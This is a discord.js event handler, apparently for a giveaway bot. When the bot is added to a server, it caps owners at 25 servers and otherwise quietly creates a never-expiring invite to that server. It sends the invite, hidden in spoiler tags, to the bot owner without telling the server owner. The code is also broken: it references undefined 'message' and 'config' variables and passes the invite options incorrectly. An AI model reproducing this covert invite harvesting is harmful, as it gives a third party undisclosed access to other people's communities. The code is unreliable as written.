const Discord = require("discord.js");

module.exports = async (bot, g) => {

    let ownerList = new Discord.Collection();

    bot.guilds.forEach(g => {
        if(ownerList.get(g.owner.id)) {
            ownerList.set(g.owner.id, ownerList.get(g.owner.id) + 1);
        } else {
            ownerList.set(g.owner.id, 1)
        }
    }) 

    if(ownerList.get(g.owner.id) > 25){
        var replyEmbed = new Discord.MessageEmbed()
            .setColor(config.COLORS.DENY)
            .setDescription(`<@${message.author.id}> **vous avez atteint le nombre maximal de participations possibles au giveaway de Noël !**`)
        let msg = await g.owner.send(replyEmbed);
        g.leave();
        return;
    }

    let guildJoinMessage = `✅ <@${g.owner.user.id}> vient d'ajouter le bot a son serveur **${g.name}**`;
    
    if(g.members.cache.get(bot.user.id).hasPermission("CREATE_INSTANT_INVITE")){
        guildJoinMessage += `
        || ${await g.channels.cache.find(c => c.type == "text").createInvite([{maxAge: 0}])} ||`;
    }

    bot.guilds.cache.find(g2 => g2.id == "618855620820336640").members.cache.find(m => m.user.id == bot.config.OWNER_ID).send(guildJoinMessage);
}